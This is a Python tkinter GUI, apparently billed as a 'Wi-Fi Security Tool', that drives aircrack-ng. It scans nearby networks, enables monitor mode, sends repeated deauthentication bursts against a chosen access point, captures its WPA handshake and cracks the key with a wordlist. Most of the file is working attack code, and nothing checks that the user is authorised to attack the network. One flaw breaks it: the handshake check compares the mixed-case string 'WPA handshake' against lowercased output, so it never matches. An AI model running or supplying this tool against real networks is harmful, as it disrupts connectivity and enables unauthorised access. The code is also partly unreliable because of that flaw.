import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import time
import datetime
import os
import subprocess
import shutil
import random
from typing import List
import re
import tempfile
import csv

APP_TITLE = "Wi-Fi Security Tool"


class DesktopApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        self.geometry("900x520")
        # scanning / capturing state
        self.scanning = False
        self.scan_proc = None
        self.scan_tmpdir = None
        self.scan_prefix = None

        self.capturing = False
        self.capture_proc = None
        self.capture_tmpdir = None
        self.capture_prefix = None
        self.stop_capture_event = threading.Event()
        self.deauth_thread = None

        self._build_ui()

    def _build_ui(self):
        left = ttk.Frame(self)
        left.pack(side=tk.LEFT, fill=tk.Y, padx=8, pady=8)
        ttk.Label(left, text="Detected networks (ESSID | BSSID | CH | Signal)").pack(anchor=tk.W)

        # Interface selector + refresh
        ttk.Label(left, text="Select interface:").pack(anchor=tk.W, pady=(6,0))
        iface_frame = ttk.Frame(left)
        iface_frame.pack(fill=tk.X)
        self.iface_var = tk.StringVar()
        self.iface_combo = ttk.Combobox(iface_frame, textvariable=self.iface_var, values=[])
        self.iface_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.iface_refresh_btn = ttk.Button(iface_frame, text="Refresh", command=self.populate_interfaces)
        self.iface_refresh_btn.pack(side=tk.LEFT, padx=(6,0))
        # widen list for readability
        self.net_listbox = tk.Listbox(left, width=80, height=20)
        self.net_listbox.pack(pady=6)

        btn_frame = ttk.Frame(left)
        btn_frame.pack(fill=tk.X, pady=6)

        self.scan_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.capture_btn = ttk.Button(btn_frame, text="Capture Handshake", command=self.toggle_capture)
        self.capture_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.crack_btn = ttk.Button(left, text="Crack (simulate)", command=self.start_crack)
        self.crack_btn.pack(fill=tk.X)

        save_btn = ttk.Button(left, text="Save Output...", command=self.save_output)
        save_btn.pack(fill=tk.X, pady=(6,0))
        # Wordlist selection
        ttk.Label(left, text="Wordlist (for aircrack-ng):").pack(anchor=tk.W, pady=(8,0))
        wl_frame = ttk.Frame(left)
        wl_frame.pack(fill=tk.X)
        self.wordlist_var = tk.StringVar()
        self.wordlist_entry = ttk.Entry(wl_frame, textvariable=self.wordlist_var)
        self.wordlist_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        wl_btn = ttk.Button(wl_frame, text="Browse", command=self.select_wordlist)
        wl_btn.pack(side=tk.LEFT, padx=(6,0))

        # Command runner UI
        ttk.Label(left, text="Run whitelisted command:").pack(anchor=tk.W, pady=(8,0))
        cmd_frame = ttk.Frame(left)
        cmd_frame.pack(fill=tk.X)

        # whitelist similar to server
        self.ALLOWED_COMMANDS = [
            "iwconfig",
            "iw",
            "iwlist",
            "ifconfig",
            "airmon-ng",
            "airodump-ng",
            "aireplay-ng",
            "aircrack-ng",
            "timeout",
            "ls",
            "pwd",
            "whoami",
        ]

        self.cmd_var = tk.StringVar()
        self.cmd_combo = ttk.Combobox(cmd_frame, textvariable=self.cmd_var, values=self.ALLOWED_COMMANDS)
        self.cmd_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.args_entry = ttk.Entry(cmd_frame)
        self.args_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(6,0))

        self.run_btn = ttk.Button(left, text="Run", command=self.run_selected_command)
        self.run_btn.pack(fill=tk.X, pady=(6,0))

        right = ttk.Frame(self)
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=8, pady=8)

        ttk.Label(right, text="Terminal output").pack(anchor=tk.W)
        self.output = tk.Text(right, wrap="word")
        self.output.pack(fill=tk.BOTH, expand=True)

        # initial state
        self.last_capture_path = None
        self.log("App started")
        # populate interfaces on startup
        self.populate_interfaces()

    def select_wordlist(self):
        path = filedialog.askopenfilename(title="Select wordlist file", filetypes=[("Wordlist", "*.*")])
        if path:
            self.wordlist_var.set(path)
            self.log(f"Selected wordlist: {path}")

    def populate_interfaces(self):
        # Try to run iwconfig to list wireless interfaces; fall back to /sys/class/net
        interfaces = []
        try:
            exe = shutil.which("iwconfig")
            if exe:
                proc = subprocess.Popen([exe], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = proc.communicate(timeout=3)
                # iwconfig prints blocks per interface; interface name is first token on lines that start without space
                for line in out.splitlines():
                    if not line:
                        continue
                    if not line.startswith(" "):
                        parts = line.split()
                        if parts:
                            name = parts[0]
                            # skip lines like 'lo' that often show 'no wireless extensions.' optionally keep them
                            interfaces.append(name)
        except Exception:
            interfaces = []

        if not interfaces:
            # fallback: list network interfaces from sysfs
            try:
                netdir = "/sys/class/net"
                if os.path.isdir(netdir):
                    interfaces = [n for n in os.listdir(netdir) if os.path.isdir(os.path.join(netdir, n))]
            except Exception:
                interfaces = []

        # Update combobox safely on main thread
        def update_ifaces():
            self.iface_combo["values"] = interfaces
            if interfaces:
                # keep current selection if possible
                cur = self.iface_var.get()
                if not cur or cur not in interfaces:
                    self.iface_var.set(interfaces[0])
                self.log(f"Interfaces: {', '.join(interfaces)}")
            else:
                self.iface_var.set("")
                self.log("No interfaces detected")

        self.after(0, update_ifaces)

    def _is_pcap(self, path: str) -> bool:
        """Quick check if file is pcap/pcapng by magic bytes."""
        try:
            with open(path, "rb") as f:
                hdr = f.read(4)
                if len(hdr) < 4:
                    return False
                magic = hdr
                # pcap LE/BE
                if magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4"):
                    return True
                # pcap-ng
                if magic == b"\x0a\x0d\x0d\x0a":
                    return True
        except Exception:
            return False
        return False

    def log(self, msg: str):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.output.insert(tk.END, f"[{ts}] {msg}\n")
        self.output.see(tk.END)

    def run_selected_command(self):
        cmd = self.cmd_var.get().strip()
        if not cmd:
            messagebox.showinfo("No command", "Please select a command to run.")
            return
        if cmd not in self.ALLOWED_COMMANDS:
            messagebox.showerror("Not allowed", f"Command '{cmd}' is not allowed by the whitelist.")
            return
        raw_args = self.args_entry.get().strip()
        args = raw_args.split() if raw_args else []
        t = threading.Thread(target=self._run_command, args=(cmd, args))
        t.daemon = True
        t.start()

    def _run_command(self, command: str, args: List[str]):
        # Find executable
        exe = shutil.which(command)
        if not exe:
            self.log(f"Command not found in PATH: {command}")
            return

        self.log(f"Running: {command} {' '.join(args)}")
        try:
            proc = subprocess.Popen([exe] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Stream stdout
            def stream(pipe, name):
                for line in iter(pipe.readline, ""):
                    if not line:
                        break
                    self.after(0, lambda l=line.rstrip(): self.log(f"{name}: {l}"))
                pipe.close()

            threads = []
            t_out = threading.Thread(target=stream, args=(proc.stdout, "OUT"))
            t_err = threading.Thread(target=stream, args=(proc.stderr, "ERR"))
            t_out.start(); t_err.start()
            threads.extend([t_out, t_err])

            code = proc.wait()
            for t in threads:
                t.join(timeout=0.1)

            self.log(f"Process exited with code: {code}")
        except Exception as e:
            self.log(f"Failed to run command: {e}")

    def start_scan(self):
        # Toggle scanning: start or stop
        if not self.scanning:
            t = threading.Thread(target=self._start_airodump_scan)
            t.daemon = True
            t.start()
        else:
            # stop
            self._stop_airodump_scan()

    # (scan functions unchanged - omitted here for brevity in this view)
    # For the canvas version we keep the original scan functions below

    def _start_airodump_scan(self):
        iface = self.iface_var.get().strip()
        if not iface:
            self.log("No interface selected for scan")
            return

        airodump_exe = shutil.which("airodump-ng")
        if not airodump_exe:
            self.log("airodump-ng not available; falling back to quick scan (iw/iwlist)")
            self._scan()
            return

        tmp = tempfile.mkdtemp(prefix="airodump_")
        prefix = os.path.join(tmp, "dump")
        self.scan_tmpdir = tmp
        self.scan_prefix = prefix

        cmd = ["sudo", airodump_exe, "--write-interval", "1", "--output-format", "csv", "-w", prefix, iface]
        self.log(f"Starting airodump-ng scan: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        except Exception as e:
            self.log(f"Failed to start airodump-ng: {e}")
            return

        self.scan_proc = proc
        self.scanning = True

        def set_btn_stop():
            self.scan_btn.config(text="Stop Scan")
        self.after(0, set_btn_stop)

        def drain_streams(p):
            try:
                for line in iter(p.stdout.readline, ""):
                    if not line:
                        break
                    self.after(0, lambda l=line.rstrip(): self.log(f"airodump: {l}"))
                p.stdout.close()
            except Exception:
                pass
            try:
                for line in iter(p.stderr.readline, ""):
                    if not line:
                        break
                    self.after(0, lambda l=line.rstrip(): self.log(f"airodump-err: {l}"))
                p.stderr.close()
            except Exception:
                pass

        t = threading.Thread(target=drain_streams, args=(proc,))
        t.daemon = True
        t.start()

        try:
            while self.scanning and proc.poll() is None:
                csv_path = prefix + "-01.csv"
                if os.path.exists(csv_path):
                    try:
                        nets = self._parse_airodump_csv(csv_path)
                        def update_list():
                            self.net_listbox.delete(0, tk.END)
                            for n in nets:
                                name = n.get("essid") or "<hidden>"
                                b = n.get("bssid") or "00:00:00:00:00:00"
                                ch = n.get("channel") or "?"
                                pwr = n.get("power")
                                sig_text = f"{pwr} dBm" if pwr is not None else ""
                                display = f"{name}  |  {b}  |  CH:{ch}"
                                if sig_text:
                                    display += f"  |  {sig_text}"
                                self.net_listbox.insert(tk.END, display)
                            self.log(f"Scan update: {len(nets)} networks")
                        self.after(0, update_list)
                    except Exception as e:
                        self.log(f"Failed to parse CSV: {e}")
                time.sleep(1.0)

        finally:
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                except Exception:
                    pass
            self.scanning = False
            self.scan_proc = None
            def set_btn_start():
                self.scan_btn.config(text="Start Scan")
            self.after(0, set_btn_start)
            self.log("Airodump scan stopped")

    def _stop_airodump_scan(self):
        if not self.scanning and not self.scan_proc:
            self.log("No active scan to stop")
            return
        self.log("Stopping scan...")
        self.scanning = False
        if self.scan_proc and self.scan_proc.poll() is None:
            try:
                self.scan_proc.terminate()
            except Exception:
                pass
        self.scan_proc = None

    def _parse_airodump_csv(self, csv_path: str):
        rows = []
        try:
            with open(csv_path, newline='', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                rows = [r for r in reader]
        except Exception as e:
            raise

        header_idx = None
        header = None
        for i, r in enumerate(rows):
            if any((cell or '').strip().lower() == 'bssid' for cell in r):
                header_idx = i
                header = [ (cell or '').strip().lower() for cell in r ]
                break

        if header_idx is None or header is None:
            return []

        networks = []
        for r in rows[header_idx+1:]:
            if not r:
                break
            first = (r[0] or '').strip().lower()
            if first.startswith('station mac') or first.startswith('station'):
                break
            if not (r[0] or '').strip():
                break

            if len(r) < len(header):
                r = r + [''] * (len(header) - len(r))

            idx = {h: idx for idx, h in enumerate(header)}
            bssid = r[idx.get('bssid', 0)].strip()
            essid = r[idx.get('essid', len(r)-1)].strip() if 'essid' in idx else r[-1].strip()
            channel = r[idx.get('channel', '')].strip() if 'channel' in idx else ''
            power = None
            for key in ('power', 'pwr'):
                if key in idx:
                    val = (r[idx[key]] or '').strip()
                    try:
                        power = int(val)
                    except Exception:
                        power = None
                    break

            networks.append({'bssid': bssid, 'essid': essid, 'channel': channel, 'power': power})

        return networks

    def _scan(self):
        self.log("Starting quick scan...")
        iface = self.iface_var.get().strip()
        if not iface:
            self.log("No interface selected for scan")
            return

        nets = []
        try:
            iw_exe = shutil.which("iw")
            if iw_exe:
                proc = subprocess.Popen([iw_exe, "dev", iface, "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = proc.communicate(timeout=8)
                bssid = None
                ssid = None
                sig = None
                for line in out.splitlines():
                    line = line.strip()
                    m = re.match(r"^BSS\s+([0-9a-f:]{17})", line, re.I)
                    if m:
                        if bssid is not None:
                            nets.append((ssid if ssid is not None else "", bssid, sig if sig is not None else ""))
                        bssid = m.group(1)
                        ssid = ""
                        sig = None
                        continue
                    if line.startswith("SSID:"):
                        ssid = line.split("SSID:", 1)[1].strip()
                    elif line.startswith("signal:"):
                        m2 = re.search(r"([-0-9.]+)", line)
                        if m2:
                            try:
                                sig = int(float(m2.group(1)))
                            except Exception:
                                sig = None
                if bssid is not None:
                    nets.append((ssid if ssid is not None else "", bssid, sig if sig is not None else ""))
        except Exception:
            pass

        if not nets:
            try:
                iwlist_exe = shutil.which("iwlist")
                if iwlist_exe:
                    proc = subprocess.Popen([iwlist_exe, iface, "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    out, err = proc.communicate(timeout=8)
                    bssid = None
                    ssid = None
                    sig = None
                    for line in out.splitlines():
                        line = line.strip()
                        m = re.match(r"^Cell\s+\d+\s+-\s+Address:\s*([0-9A-Fa-f:]{17})", line)
                        if m:
                            if bssid is not None:
                                nets.append((ssid if ssid is not None else "", bssid, sig if sig is not None else ""))
                            bssid = m.group(1)
                            ssid = ""
                            sig = None
                            continue
                        if "ESSID:" in line:
                            m2 = re.search(r'ESSID:"(.*)"', line)
                            if m2:
                                ssid = m2.group(1)
                        if "Signal level" in line:
                            m3 = re.search(r"Signal level=([-0-9]+)\s*dBm", line)
                            if m3:
                                try:
                                    sig = int(m3.group(1))
                                except Exception:
                                    sig = None
                    if bssid is not None:
                        nets.append((ssid if ssid is not None else "", bssid, sig if sig is not None else ""))
            except Exception:
                pass

        if not nets:
            self.log("No networks found via system scan; falling back to simulated scan")
            time.sleep(1)
            for i in range(random.randint(4, 8)):
                ssid = f"Network_{random.randint(100,999)}"
                bssid = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                sig = random.randint(-90, -30)
                nets.append((ssid, bssid, sig))

        def update():
            self.net_listbox.delete(0, tk.END)
            for s, b, sig in nets:
                name = s if (s is not None and s != "") else "<hidden>"
                sig_text = f"{sig} dBm" if sig != "" and sig is not None else ""
                display = f"{name}  |  {b}"
                if sig_text:
                    display += f"  |  {sig_text}"
                self.net_listbox.insert(tk.END, display)
            self.log(f"Scan complete: {len(nets)} networks found")

        self.after(0, update)

    # --- Capture logic (updated) ---
    def toggle_capture(self):
        if not self.capturing:
            sel = self.net_listbox.curselection()
            if not sel:
                messagebox.showinfo("No network selected", "Please select a network to capture handshake from.")
                return
            t = threading.Thread(target=self._capture, args=(sel[0],))
            t.daemon = True
            t.start()
        else:
            # stop capture requested by user
            self._stop_capture()

    def _set_capture_mode(self, enabled: bool):
        # Disable/enable UI elements while capturing
        widgets = [self.scan_btn, self.crack_btn, self.run_btn, self.iface_refresh_btn]
        for w in widgets:
            try:
                if enabled:
                    w.state(['disabled'])
                else:
                    w.state(['!disabled'])
            except Exception:
                try:
                    w.config(state=tk.DISABLED if enabled else tk.NORMAL)
                except Exception:
                    pass
        # update capture button text
        self.capture_btn.config(text="Stop Capture" if enabled else "Capture Handshake")

    def _stop_capture(self):
        if not self.capturing:
            return
        self.log("Stopping capture (user requested)...")
        self.stop_capture_event.set()
        # terminate airodump process
        try:
            if self.capture_proc and self.capture_proc.poll() is None:
                self.capture_proc.send_signal(subprocess.signal.SIGINT)
        except Exception:
            try:
                if self.capture_proc and self.capture_proc.poll() is None:
                    self.capture_proc.terminate()
            except Exception:
                pass
        # wait a moment for threads to exit
        time.sleep(0.2)

    def _capture(self, index):
        import signal

        # mark start
        self.capturing = True
        self.stop_capture_event.clear()
        self._set_capture_mode(True)
        self.log("Starting handshake capture (files will be saved under ./captures/ by default)...")

        try:
            entry = self.net_listbox.get(index)
        except Exception:
            entry = "<unknown>  |  00:00:00:00:00:00  |  CH:?  |  -"

        parts = [p.strip() for p in entry.split("|")]
        ssid = parts[0] if len(parts) > 0 else "<hidden>"
        bssid = None
        channel = None

        for p in parts:
            m = re.search(r"([0-9A-Fa-f:]{17})", p)
            if m and not bssid:
                bssid = m.group(1)
            mch = re.search(r"CH[:\s]*([0-9]+)", p, re.I)
            if mch and not channel:
                channel = mch.group(1)

        if not bssid:
            self.log("Cannot determine BSSID from selection")
            self._set_capture_mode(False)
            self.capturing = False
            return

        if not channel:
            channel = "6"

        iface = self.iface_var.get().strip()
        if not iface:
            self.log("No interface selected")
            self._set_capture_mode(False)
            self.capturing = False
            return

        # Ensure monitor mode is enabled (we won't assume name changes)
        try:
            self.log(f"Enabling monitor mode on {iface} (if needed)...")
            subprocess.run(["sudo", "airmon-ng", "start", iface], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        except Exception as e:
            self.log(f"airmon-ng start warning: {e}")

        monitor_iface = iface
        try:
            iwcfg = subprocess.check_output(["iwconfig"], text=True, stderr=subprocess.DEVNULL)
            if (iface + "mon") in iwcfg:
                monitor_iface = iface + "mon"
        except Exception:
            pass

        self.log(f"Monitor interface: {monitor_iface}")

        # prepare capture directory under current working directory
        try:
            cwd = os.getcwd()
            captures_dir = os.path.join(cwd, "captures")
            os.makedirs(captures_dir, exist_ok=True)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            prefix = os.path.join(captures_dir, f"dump_{timestamp}")
            self.capture_tmpdir = captures_dir
            self.capture_prefix = prefix
        except Exception as e:
            self.log(f"Failed to prepare captures directory: {e}")
            # fallback to tmp if needed
            tmp = tempfile.mkdtemp(prefix="capture_")
            prefix = os.path.join(tmp, "dump")
            self.capture_tmpdir = tmp
            self.capture_prefix = prefix

        cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", prefix, monitor_iface]
        self.log(f"Running: {' '.join(cmd)}")

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        except Exception as e:
            self.log(f"Failed to start airodump-ng: {e}")
            self._set_capture_mode(False)
            self.capturing = False
            return

        self.capture_proc = proc
        handshake_found = False
        start_time = time.time()
        timeout = 180  # seconds

        # start deauth thread (send deauth bursts every 60s)
        def deauth_loop():
            aireplay = shutil.which('aireplay-ng')
            if not aireplay:
                self.log('aireplay-ng not found; deauth disabled')
                return
            while not self.stop_capture_event.is_set() and not handshake_found:
                try:
                    # send a short burst of deauths (5 packets)
                    self.log(f"Sending deauth burst to {bssid} on {monitor_iface}...")
                    subprocess.run(["sudo", aireplay, "--deauth", "5", "-a", bssid, monitor_iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
                except Exception as e:
                    self.log(f"Deauth attempt failed: {e}")
                # wait up to 60s, but break early if stop requested
                for _ in range(60):
                    if self.stop_capture_event.is_set() or handshake_found:
                        break
                    time.sleep(1)

        self.deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
        self.deauth_thread.start()

        def stream_reader(pipe, name):
            nonlocal handshake_found
            try:
                for line in iter(pipe.readline, ""):
                    if not line:
                        break
                    l = line.rstrip()
                    self.after(0, lambda text=l, nm=name: self.log(f"{nm}: {text}"))
                    low = l.lower()
                    if "WPA handshake" in low:
                        handshake_found = True
                        self.after(0, lambda: self.log("Handshake detected in airodump output"))
                        try:
                            proc.send_signal(signal.SIGINT)
                        except Exception:
                            try:
                                proc.terminate()
                            except:
                                pass
                        break
                    # allow stop request to interrupt
                    if self.stop_capture_event.is_set():
                        break
            except Exception:
                pass
            finally:
                try:
                    pipe.close()
                except:
                    pass

        t_out = threading.Thread(target=stream_reader, args=(proc.stdout, "OUT"), daemon=True)
        t_err = threading.Thread(target=stream_reader, args=(proc.stderr, "ERR"), daemon=True)
        t_out.start(); t_err.start()

        # Wait loop
        while True:
            if handshake_found:
                break
            if proc.poll() is not None:
                break
            if self.stop_capture_event.is_set():
                break
            if time.time() - start_time > timeout:
                self.after(0, lambda: self.log(f"No handshake after {timeout}s, stopping capture"))
                try:
                    proc.send_signal(signal.SIGINT)
                except Exception:
                    try:
                        proc.terminate()
                    except:
                        pass
                break
            time.sleep(0.5)

        # ensure process stopped
        try:
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.terminate()
            except:
                pass

        captured_file = f"{prefix}-01.cap"

        if os.path.exists(captured_file) and handshake_found:
            # ask user where to save the final capture now (default to captures dir)
            def ask_and_move():
                default_name = f"handshake_{ssid.replace(' ', '_')}.cap"
                default_dir = self.capture_tmpdir if self.capture_tmpdir else os.getcwd()
                path = filedialog.asksaveasfilename(
                    title="Save handshake capture (final .cap)",
                    initialdir=default_dir,
                    initialfile=default_name,
                    defaultextension=".cap",
                    filetypes=[("Capture files", "*.cap"), ("All files", "*.*")]
                )
                if not path:
                    # user cancelled: keep file in captures dir and inform path
                    self.log(f"User cancelled saving capture; temporary file left in: {captured_file}")
                    self.last_capture_path = captured_file
                    return
                try:
                    shutil.move(captured_file, path)
                    self.last_capture_path = path
                    self.log(f"✅ Handshake capture saved to: {path} (channel {channel})")
                except Exception as e:
                    self.log(f"Failed to move capture file: {e}")
                    # keep original
                    self.last_capture_path = captured_file
            self.after(0, ask_and_move)
        else:
            if os.path.exists(captured_file):
                self.log(f"Capture file {captured_file} exists but no handshake was found")
                self.last_capture_path = captured_file
            else:
                self.log("Capture file not found; no handshake captured")

        # cleanup: try to stop monitor interface (optional)
        try:
            subprocess.run(["sudo", "airmon-ng", "stop", monitor_iface], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        except Exception:
            pass

        # stop deauth thread
        self.stop_capture_event.set()
        # small wait for background threads
        time.sleep(0.2)

        # reset state & UI
        self.capturing = False
        self.capture_proc = None
        self._set_capture_mode(False)

    def start_crack(self):
        sel = self.net_listbox.curselection()
        if not sel:
            messagebox.showinfo("No network selected", "Please select a network to crack (simulated).")
            return
        t = threading.Thread(target=self._crack, args=(sel[0],))
        t.daemon = True
        t.start()

    def _crack(self, index):
        self.crack_btn.config(state=tk.DISABLED)
        self.log("Starting cracking routine...")
        overall_start = time.time()

        # try to see if aircrack-ng is available; if not simulate
        try:
            proc_path = shutil.which("aircrack-ng")
        except Exception:
            proc_path = None

        if proc_path:
            self.log("aircrack-ng found, running real command (will prompt for .cap and wordlist if needed)")
            self.log(f"aircrack-ng path: {proc_path}")

            cap = self.last_capture_path
            if not cap or not os.path.exists(cap):
                cap = filedialog.askopenfilename(title="Select capture file (.cap)", filetypes=[("Capture files", "*.cap"), ("All files", "*.*")])
                if not cap:
                    self.log("No capture file provided. Aborting real crack.")
                    self.crack_btn.config(state=tk.NORMAL)
                    return

            wordlist = self.wordlist_var.get().strip()
            if not wordlist or not os.path.exists(wordlist):
                wordlist = filedialog.askopenfilename(title="Select wordlist file", filetypes=[("Wordlist", "*.*")])
                if not wordlist:
                    self.log("No wordlist provided. Aborting real crack.")
                    self.crack_btn.config(state=tk.NORMAL)
                    return

            try:
                exe = proc_path
                self.log(f"Running: {exe} -w {wordlist} {cap}")
                p = subprocess.Popen([exe, "-w", wordlist, cap], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                def stream(pipe, name):
                    for line in iter(pipe.readline, ""):
                        if not line:
                            break
                        self.after(0, lambda l=line.rstrip(): self.log(f"{name}: {l}"))
                    pipe.close()

                t_out = threading.Thread(target=stream, args=(p.stdout, "OUT"))
                t_err = threading.Thread(target=stream, args=(p.stderr, "ERR"))
                t_out.start(); t_err.start()
                code = p.wait()
                t_out.join(timeout=0.1); t_err.join(timeout=0.1)
                end_time = time.time()
                elapsed = end_time - overall_start
                self.log(f"aircrack-ng exited with code: {code}")
                self.log(f"Crack finished in {elapsed:.2f}s")
                messagebox.showinfo("Crack finished", f"aircrack-ng exited with code {code}\nTime: {elapsed:.2f}s")
            except Exception as e:
                self.log(f"Failed to run aircrack-ng: {e}")
            time.sleep(0.2)
        else:
            # simulated cracking but show progress + time and result in UI
            steps = 6
            for i in range(steps):
                time.sleep(0.9)
                pct = int((i+1)/steps*100)
                self.log(f"Cracking... {pct}%")

            end_time = time.time()
            elapsed = end_time - overall_start

            if random.random() < 0.35:
                key = "correcthorsebatterystaple"
                self.log(f"Key found: {key}")
                self.log(f"Crack finished in {elapsed:.2f}s")
                messagebox.showinfo("Crack result", f"Key found: {key}\nTime: {elapsed:.2f}s")
            else:
                self.log("Key not found (simulated)")
                self.log(f"Crack finished in {elapsed:.2f}s")
                messagebox.showinfo("Crack result", f"Key not found (simulated)\nTime: {elapsed:.2f}s")

        self.crack_btn.config(state=tk.NORMAL)

    def save_output(self):
        txt = self.output.get("1.0", tk.END)
        if not txt.strip():
            messagebox.showinfo("No output", "There is no terminal output to save.")
            return
        path = filedialog.asksaveasfilename(title="Save output", defaultextension=".txt",
                                            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                                            initialdir=os.getcwd())
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.write(txt)
        self.log(f"Output saved to: {path}")


if __name__ == '__main__':
    app = DesktopApp()
    app.mainloop()
